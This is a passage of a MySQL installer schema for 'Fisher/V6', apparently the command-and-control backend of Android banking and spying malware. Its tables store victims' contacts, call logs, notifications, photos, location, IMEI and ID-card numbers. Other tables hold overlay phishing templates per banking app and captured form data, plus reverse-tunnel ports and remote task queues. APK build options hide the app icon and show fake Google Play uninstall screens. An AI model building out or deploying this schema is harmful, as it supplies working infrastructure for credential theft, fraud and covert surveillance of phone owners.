-- Fisher/V6 schema-only installer
-- Generated from the provided repair SQL dump. No account, token, or device data is included.
SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS=0;

CREATE TABLE IF NOT EXISTS `fisher_debug_events` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `session_id` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `source` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `stage` varchar(96) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `level` varchar(16) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'info',
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `event_time` bigint unsigned NOT NULL DEFAULT '0',
  `details_json` longtext COLLATE utf8mb4_unicode_ci,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `idx_session_id` (`session_id`,`id`),
  KEY `idx_device_id` (`device_id`,`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_active_injection_tasks` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `package_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `task_json` longtext COLLATE utf8mb4_unicode_ci,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_device_pkg` (`device_id`,`package_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_adb_sessions` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `tunnel_port` int unsigned NOT NULL DEFAULT '0',
  `status` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `started_at` int unsigned NOT NULL DEFAULT '0',
  `ended_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_device` (`device_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_ai_config` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `config_key` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `config_value` longtext COLLATE utf8mb4_unicode_ci,
  `updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_config_key` (`config_key`)
) ENGINE=InnoDB AUTO_INCREMENT=19 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_ai_device_data` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `data_type` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `data_json` longtext COLLATE utf8mb4_unicode_ci,
  `data_count` int unsigned NOT NULL DEFAULT '0',
  `updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_device_type` (`device_id`,`data_type`)
) ENGINE=InnoDB AUTO_INCREMENT=151 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_ai_reports` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `report` longtext COLLATE utf8mb4_unicode_ci,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `idx_device` (`device_id`),
  KEY `idx_created` (`created_at`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_api_tokens` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int unsigned NOT NULL DEFAULT '0',
  `token_hash` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `name` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `scopes` text COLLATE utf8mb4_unicode_ci,
  `expires_at` int unsigned NOT NULL DEFAULT '0',
  `last_used_at` int unsigned NOT NULL DEFAULT '0',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_apk_build_configs` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `build_id` int unsigned NOT NULL DEFAULT '0',
  `filename` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `server_url` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `web_url` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `app_name` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `package_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `version_name` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `version_code` int unsigned NOT NULL DEFAULT '1',
  `enable_config_mask` tinyint unsigned NOT NULL DEFAULT '0',
  `enable_service_mode` tinyint unsigned NOT NULL DEFAULT '0',
  `show_app_icon` tinyint unsigned NOT NULL DEFAULT '1',
  `uninstall_mode` tinyint unsigned NOT NULL DEFAULT '0',
  `uninstall_style` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'googleplay',
  `config_mask_text` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `config_mask_subtitle` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `page_style_config` longtext COLLATE utf8mb4_unicode_ci,
  `loading_tips` text COLLATE utf8mb4_unicode_ci,
  `uninstall_overlay_texts` text COLLATE utf8mb4_unicode_ci,
  `icon_path` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `bg_path` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `app_icon` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `frps_addr` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `frps_token` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `config_json` longtext COLLATE utf8mb4_unicode_ci,
  `owner_username` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `idx_build_id` (`build_id`),
  KEY `idx_owner` (`owner_username`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_apk_builds` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `filename` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `server_url` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `web_url` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `app_name` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `package_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `version_name` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `version_code` int unsigned NOT NULL DEFAULT '1',
  `status` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'pending',
  `owner_username` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `file_size` bigint unsigned NOT NULL DEFAULT '0',
  `config_json` longtext COLLATE utf8mb4_unicode_ci,
  `output_json` longtext COLLATE utf8mb4_unicode_ci,
  `created_at` int unsigned NOT NULL DEFAULT '0',
  `updated_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_filename` (`filename`),
  KEY `idx_owner` (`owner_username`),
  KEY `idx_status` (`status`),
  KEY `idx_created` (`created_at`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_apk_installs` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `package_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `apk_path` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `status` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `installer` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_device` (`device_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_app_owner_map` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `app_name` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `owner_username` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_app_name` (`app_name`),
  KEY `idx_owner` (`owner_username`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_app_updates` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `version_code` int unsigned NOT NULL DEFAULT '0',
  `version_name` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `download_url` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `file_size` bigint unsigned NOT NULL DEFAULT '0',
  `update_log` text COLLATE utf8mb4_unicode_ci,
  `force_update` tinyint unsigned NOT NULL DEFAULT '0',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_version_code` (`version_code`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_audit_logs` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int unsigned NOT NULL DEFAULT '0',
  `username` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `action` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `target_type` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `target_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `ip` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `detail_json` longtext COLLATE utf8mb4_unicode_ci,
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_user` (`user_id`),
  KEY `idx_action` (`action`),
  KEY `idx_created` (`created_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_black_apps` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `package_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `app_name` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_package` (`package_name`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_bridge_logs` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `log_type` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `content` longtext COLLATE utf8mb4_unicode_ci,
  `timestamp` bigint unsigned NOT NULL DEFAULT '0',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_device` (`device_id`),
  KEY `idx_created` (`created_at`)
) ENGINE=InnoDB AUTO_INCREMENT=115309 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_call_logs` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `number` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `type` tinyint unsigned NOT NULL DEFAULT '0',
  `duration` int unsigned NOT NULL DEFAULT '0',
  `date` bigint unsigned NOT NULL DEFAULT '0',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_device` (`device_id`),
  KEY `idx_date` (`date`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_contacts` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `display_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `phone_number` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `raw_data` longtext COLLATE utf8mb4_unicode_ci,
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_device` (`device_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_cron_jobs` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `job_name` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `cron_expr` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `command` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `enabled` tinyint unsigned NOT NULL DEFAULT '1',
  `last_run_at` int unsigned NOT NULL DEFAULT '0',
  `next_run_at` int unsigned NOT NULL DEFAULT '0',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_job_name` (`job_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_device_apps` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `installed_apps` longtext COLLATE utf8mb4_unicode_ci,
  `injection_active` tinyint unsigned NOT NULL DEFAULT '1',
  `updated_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_device_id` (`device_id`)
) ENGINE=InnoDB AUTO_INCREMENT=68 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_device_groups` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_name` (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_device_media` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `media_type` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `file_path` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `file_size` bigint unsigned NOT NULL DEFAULT '0',
  `width` int unsigned NOT NULL DEFAULT '0',
  `height` int unsigned NOT NULL DEFAULT '0',
  `taken_time` bigint unsigned NOT NULL DEFAULT '0',
  `thumbnail` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `owner_username` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_device` (`device_id`),
  KEY `idx_taken` (`taken_time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_device_notifications` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `package_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `title` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `content` text COLLATE utf8mb4_unicode_ci,
  `posted_time` bigint unsigned NOT NULL DEFAULT '0',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_device` (`device_id`),
  KEY `idx_posted` (`posted_time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_device_payment_strategy_bindings` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `strategy_id` int unsigned NOT NULL DEFAULT '0',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_device_strategy` (`device_id`,`strategy_id`),
  KEY `idx_strategy` (`strategy_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_device_tasks` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `task_type` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `task_payload` longtext COLLATE utf8mb4_unicode_ci,
  `status` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'pending',
  `result_text` longtext COLLATE utf8mb4_unicode_ci,
  `owner_username` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  `started_at` int unsigned NOT NULL DEFAULT '0',
  `finished_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_device` (`device_id`),
  KEY `idx_status` (`status`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_devices` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `brand` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `model` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `os_version` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `app_version` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `app_name` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `phone_number` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `public_ip` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `screen_width` int unsigned NOT NULL DEFAULT '0',
  `screen_height` int unsigned NOT NULL DEFAULT '0',
  `owner_username` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `user_id` int unsigned NOT NULL DEFAULT '0',
  `is_connected` tinyint unsigned NOT NULL DEFAULT '0',
  `connected_at` int unsigned NOT NULL DEFAULT '0',
  `last_seen` int unsigned NOT NULL DEFAULT '0',
  `first_seen` int unsigned NOT NULL DEFAULT '0',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  `permissions` mediumtext COLLATE utf8mb4_unicode_ci,
  `remote_port` int unsigned NOT NULL DEFAULT '0',
  `tunnel_deployed` tinyint unsigned NOT NULL DEFAULT '0',
  `group_name` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `remark` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `real_name` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `id_card` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `expiry_date` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `other_info` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `black_screen_active` tinyint unsigned NOT NULL DEFAULT '0',
  `is_screen_on` tinyint unsigned NOT NULL DEFAULT '1',
  `is_device_owner` tinyint unsigned NOT NULL DEFAULT '0',
  `device_input_blocked` tinyint unsigned NOT NULL DEFAULT '0',
  `lock_screen_type` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `local_service_connected` tinyint unsigned NOT NULL DEFAULT '0',
  `battery_level` int unsigned NOT NULL DEFAULT '0',
  `network_type` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `is_charging` tinyint unsigned NOT NULL DEFAULT '0',
  `is_locked` tinyint unsigned NOT NULL DEFAULT '0',
  `accessibility_alive` tinyint unsigned NOT NULL DEFAULT '0',
  `shizuku_alive` tinyint unsigned NOT NULL DEFAULT '0',
  `country` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `province` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `city` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `isp` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `geo_raw` text COLLATE utf8mb4_unicode_ci,
  `location_lat` decimal(10,7) NOT NULL DEFAULT '0.0000000',
  `location_lng` decimal(10,7) NOT NULL DEFAULT '0.0000000',
  `location_time` int unsigned NOT NULL DEFAULT '0',
  `geo_location` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT 'è®¾å¤‡åœ°ç†ä½ç½®',
  `ip_address` varchar(64) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT 'è®¾å¤‡IP',
  `android_version` varchar(32) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT 'å®‰å“ç‰ˆæœ¬',
  `sdk_version` int DEFAULT '0' COMMENT 'SDKç‰ˆæœ¬',
  `serial` varchar(128) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT 'åºåˆ—å·',
  `android_id` varchar(64) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT 'android_id',
  `manufacturer` varchar(64) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT 'åŽ‚å•†',
  `abis` varchar(128) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT 'CPU ABI',
  `total_memory` bigint DEFAULT '0' COMMENT 'æ€»å†…å­˜MB',
  `total_storage` bigint DEFAULT '0' COMMENT 'æ€»å­˜å‚¨MB',
  `used_storage` bigint DEFAULT '0' COMMENT 'å·²ç”¨å­˜å‚¨MB',
  `imsi` varchar(64) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT 'IMSI',
  `imei` varchar(64) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT 'IMEI',
  `sim_operator` varchar(64) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT 'SIMè¿è¥å•†',
  `device_owner_enabled` tinyint DEFAULT '0' COMMENT 'DeviceOwner',
  `accessibility_enabled` tinyint DEFAULT '0' COMMENT 'æ— éšœç¢å†—ä½™',
  `shizuku_enabled` tinyint DEFAULT '0' COMMENT 'Shizuku',
  `local_service_version` varchar(32) COLLATE utf8mb4_unicode_ci DEFAULT NULL COMMENT 'LocalServiceç‰ˆæœ¬',
  `last_heartbeat_at` int DEFAULT '0' COMMENT 'æœ€åŽå¿ƒè·³æ—¶é—´æˆ³',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_device_id` (`device_id`),
  KEY `idx_owner` (`owner_username`),
  KEY `idx_user_id` (`user_id`),
  KEY `idx_conn_lastseen` (`is_connected`,`last_seen`),
  KEY `idx_remote_port` (`remote_port`),
  KEY `idx_group` (`group_name`),
  KEY `idx_created` (`created_at`)
) ENGINE=InnoDB AUTO_INCREMENT=444 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_file_transfers` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `direction` varchar(16) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `local_path` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `remote_path` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `file_size` bigint unsigned NOT NULL DEFAULT '0',
  `transferred` bigint unsigned NOT NULL DEFAULT '0',
  `status` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `owner_username` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `created_at` int unsigned NOT NULL DEFAULT '0',
  `finished_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_device` (`device_id`),
  KEY `idx_status` (`status`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_injection_data` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `device_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `template_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `package_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `form_data` longtext COLLATE utf8mb4_unicode_ci,
  `created_at` int unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_device` (`device_id`),
  KEY `idx_package` (`package_name`),
  KEY `idx_created` (`created_at`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_injection_templates` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `template_id` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `package_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `country` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `icon` varchar(512) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `color` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `file` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `type` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `html_content` longtext COLLATE utf8mb4_unicode_ci,
  `enabled` tinyint unsigned NOT NULL DEFAULT '1',
  `visible` tinyint unsigned NOT NULL DEFAULT '1',
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_template_id` (`template_id`),
  KEY `idx_package` (`package_name`),
  KEY `idx_enabled` (`enabled`),
  KEY `idx_country` (`country`)
) ENGINE=InnoDB AUTO_INCREMENT=481 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS `fisher_ip_region` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `start_ip` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
